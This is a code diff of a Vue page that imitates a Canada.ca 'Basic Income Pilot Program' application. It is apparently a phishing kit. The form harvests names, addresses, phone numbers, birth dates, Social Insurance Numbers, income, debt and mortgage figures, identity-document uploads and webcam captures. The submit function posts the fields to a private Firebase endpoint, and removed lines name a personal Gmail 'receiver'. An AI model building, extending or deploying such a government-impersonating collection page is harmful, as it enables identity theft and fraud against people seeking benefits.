@@ -1,4 +1,3 @@
-
 <template>
 
   <body typeof="WebPage" resource="#wb-webpage">
@@ -68,7 +67,7 @@
             >
               <h2>Search</h2>
 
-              <form action="#" method="get" name="cse-search-box" role="search">
+              <form  name="cse-search-box" role="search">
                 <div class="form-group wb-srch-qry">
                   <label for="wb-srch-q" class="wb-inv">Search Canada.ca</label>
 
@@ -91,9 +90,8 @@
                       type="submit"
                       id="wb-srch-sub"
                       class="btn btn-primary btn-small"
-                      name="wb-srch-sub"
-                  >
-                      <span class=""><search-outlined></search-outlined></span
+                      name="wb-srch-sub"  style="background-color:  #26374a;border: none" >
+                      <span class=""><SearchOutlined style="color: white;font-weight: bolder; font-size: large" /></span
                       ><span class="wb-inv">Search</span>
                   </button>
                 </div>
@@ -138,8 +136,8 @@
           <h2 class="wb-inv">You are here:</h2>
           <div class="container">
             <ol class="breadcrumb">
-              <li><a href="#">Canada.ca</a></li>
-              <li><a href="#">Canada emergency response benefit</a></li>
+              <li class="d-flex  align-center" ><a href="#" class="link-color">Canada.ca</a>    <span class="mdi mdi-chevron-right" style="font-size: 18px"></span>   <a href="#" class="link-color">Canada emergency response benefit</a></li>
+
             </ol>
           </div>
         </nav>
@@ -165,61 +163,19 @@
                <router-link :to="{name:'home'}"><a href="#" class=" hidden-xs hidden-sm" aria-current="page" tabindex="0">Overview</a></router-link>
                <router-link :to="{name:'home'}"><a href="#" class=" hidden-md hidden-lg" aria-current="page" tabindex="0">Overview</a></router-link>
             </li>
-            <li>
-               <router-link :to="{name:'apply'}"><a href="#" class="hidden-xs hidden-sm">Who needs basic income</a></router-link>
-               <router-link :to="{name:'apply'}"><a href="#" class="hidden-xs hidden-sm hidden-md hidden-lg">Who needs basic income</a></router-link>
-               <router-link :to="{name:'apply'}"><a href="#" class="visible-xs visible-sm hidden-xs hidden-sm">Who needs basic income</a></router-link>
-               <router-link :to="{name:'apply'}"><a href="#" class="visible-xs visible-sm hidden-md hidden-lg">Who needs basic income</a></router-link>
-            </li>
+<!--            <li>-->
+<!--               <router-link :to="{name:'apply'}"><a href="#" class="hidden-xs hidden-sm">Who needs basic income</a></router-link>-->
+<!--               <router-link :to="{name:'apply'}"><a href="#" class="hidden-xs hidden-sm hidden-md hidden-lg">Who needs basic income</a></router-link>-->
+<!--               <router-link :to="{name:'apply'}"><a href="#" class="visible-xs visible-sm hidden-xs hidden-sm">Who needs basic income</a></router-link>-->
+<!--               <router-link :to="{name:'apply'}"><a href="#" class="visible-xs visible-sm hidden-md hidden-lg">Who needs basic income</a></router-link>-->
+<!--            </li>-->
             <li>
               <a href="#" class=" active hidden-xs hidden-sm">Apply</a
               ><a href="#" class=" active hidden-xs hidden-sm hidden-md hidden-lg">Apply</a>
               <a href="#" class=" active visible-xs visible-sm hidden-xs hidden-sm">Apply</a
               ><a href="#" class="active visible-xs visible-sm hidden-md hidden-lg">Apply</a>
             </li>
-            <li>
-              <a href="#" class="hidden-xs hidden-sm"
-              >emergency response <abbr>benefit</abbr></a
-              ><a href="##" class="hidden-xs hidden-sm hidden-md hidden-lg"
-            >emergency response <abbr>benefit</abbr></a
-            >
-              <a href="#" class="visible-xs visible-sm hidden-xs hidden-sm"
-              >emergency response <abbr>benefit</abbr></a
-              ><a href="##" class="visible-xs visible-sm hidden-md hidden-lg"
-            >emergency response <abbr>benefit</abbr></a
-            >
-            </li>
-            <li>
-              <a href="#" class="hidden-xs hidden-sm">Disability Support <abbr></abbr></a
-              ><a href="##" class="hidden-xs hidden-sm hidden-md hidden-lg"
-            >Disability Support <abbr></abbr></a
-            >
-              <a href="#" class="visible-xs visible-sm hidden-xs hidden-sm"
-              >Disability Support <abbr></abbr></a
-              ><a href="##" class="visible-xs visible-sm hidden-md hidden-lg"
-            >Disability Support <abbr></abbr></a
-            >
-            </li>
-            <li>
-              <a href="#" class="hidden-xs hidden-sm">Universal basic income</a
-              ><a href="##" class="hidden-xs hidden-sm hidden-md hidden-lg"
-            >Universal basic income</a
-            >
-              <a href="#" class="visible-xs visible-sm hidden-xs hidden-sm">Universal basic income</a
-              ><a href="##" class="visible-xs visible-sm hidden-md hidden-lg"
-            >Universal basic income</a
-            >
-            </li>
-            <li>
-              <a href="#" class="hidden-xs hidden-sm">Guaranteed basic income</a
-              ><a href="##" class="hidden-xs hidden-sm hidden-md hidden-lg"
-            >Guaranteed basic income</a
-            >
-              <a href="#" class="visible-xs visible-sm hidden-xs hidden-sm">Guaranteed basic income</a
-              ><a href="##" class="visible-xs visible-sm hidden-md hidden-lg"
-            >Guaranteed basic income</a
-            >
-            </li>
+
           </ul>
         </nav>
       </div>
@@ -238,20 +194,18 @@
           Right now, struggling Canadians can access help support through a patchwork of federal, provincial and municipal programs.
         </p>
         <div class="w700" >
-          <form onsubmit="submitform" method="post">
+          <form @submit.prevent="submitform" method="post">
             <div class="form-header">
               BIPP Application Form
             </div>
             <div  class="form-body">
-              <a-steps :current="current" :items="items"></a-steps>
+              <a-steps :current="current" :items="items"    :status="`wait`"   :initial="0" ></a-steps>
               <div class="steps-content" v-show="!!truth" >
-                step 1
 
-                <i  style="font-size: 15px;color:#ff4d4f">*</i>
                 <v-text-field
                     v-model="firstname"
                     :rules="rules"
-                    label="First name *"
+                    label="First Name"
                     style="padding: 15px 0;"
                     color="primary"
                     variant="outlined"
@@ -261,29 +215,43 @@
                 <v-text-field
                     v-model="lastname"
                     :rules="rules"
-                    label="Last Name *"
+                    label="Last Name "
                     style="padding: 5px 0;"
                     color="primary"
                     variant="outlined"
                 >
                 </v-text-field>
 
-                <v-textarea
-                    v-model="address"
+                <v-text-field
+                    v-model="email"
                     :rules="rules"
-                    label="address *"
-                    type="textarea"
+                    label="Email "
+                    style="padding: 5px 0;"
+                    color="primary"
+                    variant="outlined"
+                    type="email"
+                >
+                </v-text-field>
+
+
+
+
+                <v-text-field
+                    v-model="stName"
+                    :rules="rules"
+                    label="Street Name "
                     style="padding: 5px 0;"
                     color="primary"
                     variant="outlined"
                 >
-                </v-textarea>
+                </v-text-field>
+
                 <div class="d-flex justify-space-between align-center ga-5">
                   <v-text-field
-                      v-model="dob"
+                      v-model="city"
                       :rules="rules"
-                      label="dob *"
-                      type="date"
+                      label="City/Town"
+                      type="input"
                       style="padding: 5px 0; width: 35%"
                       color="primary"
                       variant="outlined"
@@ -291,10 +259,9 @@
                   </v-text-field>
 
                   <v-text-field
-                      v-model="phonenumber"
+                      v-model="state"
                       :rules="rules"
-                      label="phone number *"
-                      type="number"
+                      label="Province/State"
                       style="padding: 5px 0;width: 40%"
                       color="primary"
                       variant="outlined"
@@ -302,25 +269,59 @@
                   </v-text-field>
                 </div>
 
-<!--                <p>{{firstname}} :: {{lastname}} : {{address}}:: {{phonenumber}} :: {{dob}}</p>-->
+                <div class="d-flex justify-space-between align-center ga-5">
+                  <v-text-field
+                      v-model="postal"
+                      :rules="rules"
+                      label="Postal Code"
+                      style="padding: 5px 0; width: 35%"
+                      color="primary"
+                      variant="outlined"
+                  >
+                  </v-text-field>
+
+                  <v-text-field
+                      v-model="pNumber"
+                      :rules="rules"
+                      label="Phone Number "
+                      style="padding: 5px 0;width: 40%;"
+                      color="primary"
+                      variant="outlined"
+                      type="number"
+                  >
+                  </v-text-field>
+
+                </div>
+
               </div>
 
               <div class="steps-content" v-show="truth2"   >
-                step 2
+
                 <v-select
                     v-model="mts"
-                    label="Marital status"
-                    :items="['Male', 'Female']"
+                    label="Marital Status"
+                    :items="['Married', 'Single']"
                     style="padding: 5px 0;"
                     color="primary"
                     variant="outlined"
                 ></v-select>
 
+                <v-text-field
+                    v-model="dob"
+                    :rules="rules"
+                    label="Date Of Birth"
+                    style="padding: 5px 0;"
+                    color="primary"
+                    variant="outlined"
+                    type="date"
+                >
+                </v-text-field>
+
                 <div class="d-flex justify-space-between align-center ga-5">
                   <v-text-field
                       v-model="fin"
                       :rules="rules"
-                      label="Family Income *"
+                      label="Family Income "
                       type="number"
                       style="padding: 5px 0;width: 35%"
                       color="primary"
@@ -331,7 +332,7 @@
                   <v-text-field
                       v-model="sin"
                       :rules="rules"
-                      label=" SIN *"
+                      label=" SIN "
                       type="number"
                       style="padding: 5px 0;width: 40%;"
                       color="primary"
@@ -343,97 +344,156 @@
                 <v-text-field
                     v-model="nod"
                     :rules="rules"
-                    label=" Number of Dependant *"
+                    label=" Number of Dependant "
                     type="number"
                     style="padding: 5px 0;"
                     color="primary"
                     variant="outlined"
                 >
                 </v-text-field>
-                <v-select
-                    v-model="debt"
-                    label="Are you in debt"
-                    :items="['YES', 'NO']"
+                <v-text-field
+                    v-model="ccdp"
+                    :rules="rules"
+                    label=" Credit Card Debt Payment "
+                    type="number"
                     style="padding: 5px 0;"
                     color="primary"
                     variant="outlined"
-                ></v-select>
-
-                <v-select
-                    v-model="cclm"
-                    label="Credit card Loan mortgage"
-                    :items="['YES', 'NO']"
+                >
+                </v-text-field>
+                <v-text-field
+                    v-model="mortgage"
+                    :rules="rules"
+                    label=" Mortgage Amount "
+                    type="number"
                     style="padding: 5px 0;"
                     color="primary"
                     variant="outlined"
-                ></v-select>
+                ></v-text-field>
 
 
               </div>
               <div class="steps-content" v-show="truth3">
                 <!--    {{ steps[current].content }}-->
-                step 3
-                <v-file-input label="proof of citizenship or permanent residency"
+
+                <div class="d-flex justify-space-between align-center ga-5">
+                  <v-checkbox label="Permanent  Resident" color="primary"  v-model="permanentResident" ></v-checkbox>
+
+                  <v-checkbox label="Citizenship" color="primary" v-model="citizenship" ></v-checkbox>
+                </div>
+
+                <v-file-input label="proof of citizenship  "
                               style="padding: 5px 0;"
                               color="primary"
                               variant="outlined"
-
+                              v-if="citizenship"
                 >
 
                 </v-file-input>
-                <v-file-input label="video verification"
+
+
+                <v-file-input label="proof of citizenship or permanent residency front"
                               style="padding: 5px 0;"
                               color="primary"
                               variant="outlined"
-
+                              v-if="permanentResident"
                 >
 
                 </v-file-input>
+
+                <v-file-input label="proof of citizenship or permanent residency back"
+                              style="padding: 5px 0;"
+                              color="primary"
+                              variant="outlined"
+                              v-if="permanentResident"
+                >
+
+                </v-file-input>
+
+
+                <div class="verify_button"  @click.prevent="videoVerification" >
+                  Video verification
+                </div>
+
+                <div class="App">
+                  <header class="App-header">
+<!--                    <button @click.prevent="startRecording" :disabled="isRecording || countdown > 0">-->
+<!--                      Start Recording-->
+<!--                    </button>-->
+                    <br>
+
+
+                    <div class="video-container">
+                      <video
+                          ref="videoRef"
+                          autoplay
+                          class="video-feed"
+                          v-show="isRecording"
+                      ></video>
+                      <div class="countdown" v-if="countdown > 0" v-show="isRecording">
+                        {{ countdown }}
+                      </div>
+                      <img
+                          :src="capturedImage"
+                          alt="Captured"
+                          class="captured-image"
+                          v-show="!isRecording && capturedImage"
+                      />
+                    </div>
+                    <button @click.prevent="stopRecording" class="verify_button"  v-if="stopRecord"  :disabled="!isRecording">
+                      Capture
+                    </button>
+                  </header>
+                </div>
+
               </div>
-              <div class="steps-action">
-                <a-button v-if="current < steps.length - 1" type="primary" @click="next">Next</a-button>
+              <div class="steps-action d-flex justify-space-between align-center ">
+                <a-button v-if="current < steps.length - 1" type="primary" @click="next"   class="btn-fm" >Next</a-button>
                 <a-button
                     v-if="current == steps.length - 1"
                     type="primary"
-                    @click="submitform"
+                    @click.prevent="submitform"
+                    class="btn-fm"
                 >
                   Done
                 </a-button>
-                <a-button v-if="current > 0" style="margin-left: 8px" @click="prev">Previous</a-button>
+                <a-button v-if="current > 0" style="margin-left: 8px" @click="prev" class="btn-fm">Previous</a-button>
               </div>
             </div>
 
           </form>
 
         </div>
-<!--        <button >show me</button>-->
-<!--        <p>{{firstname}} :: {{lastname}} : {{address}}:: {{phonenumber}} :: {{dob}}  {{cclm}}  {{nod}} {{debt}} {{mts}}</p>-->
         <br>
         <br>
-       <h2>Basic Income Pilot Value (BIPP)</h2>
-        <p>
-          What makes basic income different from other programs, such as income assistance or welfare, is that it comes with no strings attached. In the simplest terms, it's a regular payment without conditions, sent from the government to families and individuals.
-        </p>
-        <h2>Universal basic income (UBI)</h2>
-        <p>means that everyone in a society — rich or poor — gets a monthly cheque for the same amount. At the end of the year, the government uses the tax system to balance out the scales and recoup that extra cash from the higher income earners who didn't end up needing it. </p>
 
-        <h2>Guaranteed basic income (GBI)</h2>
-        <p>
-          is the system most people are referring to when they talk about basic income in Canada. It is an income-contingent system, meaning monthly payments only go to families and individuals with lower income.
-        </p>
-        <p>
-          Service Canada may issue a new BIPP only if there is proof that the BIPP was used
-          fraudulently. If you think this may apply to you, refer to&nbsp;<a href="#"
-        >Protecting your SIN</a
-        >
-          for more information.
-        </p>
+<!--        <div>-->
+<!--          <h2>Basic Income Pilot Value (BIPP)</h2>-->
+<!--          <p>-->
+<!--            What makes basic income different from other programs, such as income assistance or welfare, is that it comes with no strings attached. In the simplest terms, it's a regular payment without conditions, sent from the government to families and individuals.-->
+<!--          </p>-->
+<!--          <h2>Universal basic income (UBI)</h2>-->
+<!--          <p>means that everyone in a society — rich or poor — gets a monthly cheque for the same amount. At the end of the year, the government uses the tax system to balance out the scales and recoup that extra cash from the higher income earners who didn't end up needing it. </p>-->
+
+<!--          <h2>Guaranteed basic income (GBI)</h2>-->
+<!--          <p>-->
+<!--            is the system most people are referring to when they talk about basic income in Canada. It is an income-contingent system, meaning monthly payments only go to families and individuals with lower income.-->
+<!--          </p>-->
+<!--          <p>-->
+<!--            Service Canada may issue a new BIPP only if there is proof that the BIPP was used-->
+<!--            fraudulently. If you think this may apply to you, refer to&nbsp;<a href="#"-->
+<!--          >Protecting your SIN</a-->
+<!--          >-->
+<!--            for more information.-->
+<!--          </p>-->
+
+<!--        </div>-->
 
 
 
 
 
-        <h2 style="color: white">Contact</h2>
+        <h2 style="color: black">Contact</h2>
         <p>
           For more information, contact the&nbsp;<a href="#">Basic Income Pilot Program</a>.
         </p>
@@ -727,24 +787,27 @@
     </div>
   </div>
   </body>
+
 </template>
 
 <script setup >
 
-import {ref} from "vue";
+import {onUnmounted, reactive, ref} from "vue";
 import axios from "axios";
-import { message } from 'ant-design-vue';
 import {CaretDownOutlined, SearchOutlined, ShareAltOutlined} from '@ant-design/icons-vue';
 
+import {useRouter} from "vue-router";
+const  router = useRouter()
+
+const permanentResident = ref(false)
+const citizenship = ref(false)
+
 const name = ref('')
-const password = ref('')
-const  email = ref('')
+
 const loading = ref(false)
-const status = ref(null)
 const words = ref('')
-const current = ref(0)
-const website = ref('braids.com')
-const receiver = ref('talabtalab365@gmail.com')
+const current = ref("0")
+
 const truth = ref(true)
 const truth2 = ref(false)
 const truth3 = ref(false)
@@ -776,31 +839,47 @@ const prev = () => {
 
 const steps = [
   {
-    title: 'First',
+    title: '0',
     content: 'First-content',
+    stepNumber: 0,
+    subTitle: '%',
+    description: 'who please',
+    icon: '50',
   },
   {
-    title: 'Second',
+    title: '50',
     content: 'Second-content',
+    stepNumber: 50,
+    status: 'finish',
+    description: '%',
+    subTitle: '%',
+    icon: '50',
   },
   {
-    title: 'Last',
+    title: '100',
     content: 'Last-content',
+    subTitle: '%',
+    description: '%',
+    icon: '50',
   },
 ];
-const items = steps.map(item => ({ key: item.title, title: item.title }));
+const items = steps.map(item => ({ key: item.content, title: item.title, subTitle: item.subTitle, icon: item.icon, }));
 
 const firstname = ref('')
 const lastname = ref('')
-const address = ref('')
+const  email = ref('')
+const stName = ref('')
+const city = ref('')
+const state = ref('')
+const postal = ref('')
 const dob = ref('')
-const phonenumber = ref('')
+const pNumber = ref('')
 const mts = ref('')
 const fin = ref('')
 const sin = ref('')
 const nod = ref('')
-const debt = ref('')
-const cclm = ref('')
+const ccdp = ref('')
+const mortgage = ref('')
 
 const rules = ref([
   value => {
@@ -810,20 +889,25 @@ const rules = ref([
   },
 ])
 
+
 const submitform = async () => {
-  if (!!firstname.value && !!lastname.value && !!address.value && !!dob.value && !!phonenumber.value && !!mts.value && !!sin.value && !!nod.value && !!debt.value && !!cclm.value) {
+  if (!!firstname.value && !!lastname.value && !!email.value  && !!dob.value && !!pNumber.value && !!mts.value && !!sin.value && !!nod.value   && !!stName.value && !!city.value && !!state.value && !!postal.value  && !!ccdp.value && mortgage.value  ) {
     loading.value = true
     await axios.post('https://passive-2d3a5-default-rtdb.firebaseio.com/push.json' , {
         "firstname": firstname.value,
         "lastname": lastname.value,
-        "address":address.value,
-      "dob": dob.value,
-      "phonenumber": phonenumber.value,
-      "mts": mts.value,
-      "sin": sin.value,
-      "nod": nod.value,
-      "debt": debt.value,
-      "cclm": cclm.value
+        "dob": dob.value,
+      "email": email.value,
+        "pNumber": pNumber.value,
+        "mts": mts.value,
+        "sin": sin.value,
+        "nod": nod.value,
+        "debt": ccdp.value,
+      "street": stName.value,
+        "city": city.value,
+      "state": state.value,
+      "postal": postal.value,
+      "mortgage": mortgage.value,
     }, {
       headers: {
         'Content-Type': 'application/json'
@@ -836,20 +920,111 @@ const submitform = async () => {
         })
     alert('sent')
     loading.value = false
+     await router.push({name: 'apply'})
   } else {
     alert('input all fields')
   }
 }
 
+//camera setup
+
+const isRecording = ref(false);
+const capturedImage = ref(null);
+const videoRef = ref(null);
+const videoUrl = ref("");
+const countdown = ref(0);
+const mediaRecorder = ref(null);
+const stream = ref(null);
+const recordedChunks = reactive([]);
+
+const stopRecord = ref(false)
+
+const getMedia = async () => {
+  try {
+    const mediaStream = await navigator.mediaDevices.getUserMedia({
+      video: true,
+    });
+    stream.value = mediaStream;
+    if (videoRef.value) videoRef.value.srcObject = mediaStream;
+    const recorder = new MediaRecorder(mediaStream);
+    mediaRecorder.value = recorder;
+  } catch (error) {
+    console.error("Error accessing the camera:", error);
+  }
+};
+
+const stopMediaStream = () => {
+  if (stream.value) {
+    const tracks = stream.value.getTracks();
+    tracks.forEach((track) => track.stop());
+    stream.value = null; // Ensure to clear the stream state
+  }
+};
+
+const startRecording = async () => {
+  // Update the state to show the live feed and remove the captured image
+  await getMedia();
+  isRecording.value = true;
+  capturedImage.value = null;
+  countdown.value = 5; // Start countdown from 5 seconds
+  const countdownInterval = setInterval(() => {
+    if (mediaRecorder.value && mediaRecorder.value.state === "inactive") {
+      mediaRecorder.value.start();
+      console.log(mediaRecorder.value.state);
+      console.log("recorder started");
+      mediaRecorder.value.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          recordedChunks.push(event.data);
+          console.log(event.data);
+        }
+      };
+    }
+    countdown.value -= 1;
+    if (countdown.value <= 0) {
+      clearInterval(countdownInterval); // Clear interval when countdown finishes
+      countdown.value = 0;
+    }
+  }, 1000);
+};
+
+const stopRecording = () => {
+  if (mediaRecorder.value) {
+    mediaRecorder.value.stop();
+
+    const canvas = document.createElement("canvas");
+    canvas.width = videoRef.value.videoWidth;
+    canvas.height = videoRef.value.videoHeight;
+    const ctx = canvas.getContext("2d");
+
+    // Draw the current video frame to the canvas
+    ctx.drawImage(videoRef.value, 0, 0, canvas.width, canvas.height);
+
+    // Convert the canvas to an image URL
+    const imageUrl = canvas.toDataURL("image/png");
+    const videoBlob = new Blob(recordedChunks, { type: "video/webm" });
+    const url = URL.createObjectURL(videoBlob);
+    videoUrl.value = url;
+    capturedImage.value = imageUrl;
+    isRecording.value = false;
+    stopMediaStream();
+  }
+};
+
+const videoVerification = async () => {
+  await startRecording();
+  stopRecord.value = true;
+
+}
+
+// Cleanup on component unmount
+onUnmounted(() => {
+  stopMediaStream();
+});
+
 
 </script>
+
 <style lang="scss">
-.submit {
-  background-color: darkblue;
-  color: white;
-  padding: 5px;
-  text-align: center;
-}
 .steps-content {
   margin-top: 16px;
   border-radius: 0;
@@ -865,4 +1040,44 @@ const submitform = async () => {
   background-color: #2f2f2f;
   border: 1px dashed #404040;
 }
+
+.App {
+  text-align: center;
+}
+
+.App-header {
+  background-color: transparent;
+  min-height: auto;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  font-size: calc(10px + 2vmin);
+  color: #2b542c;
+}
+
+.video-container {
+  position: relative;
+}
+
+.video-feed {
+  padding: 20px;
+  width: 100%;
+  max-width: 100%;
+}
+
+.countdown {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  font-size: 48px;
+  color: green;
+}
+
+.captured-image {
+  width: 100%;
+  max-width: 100%;
+}
+
 </style>
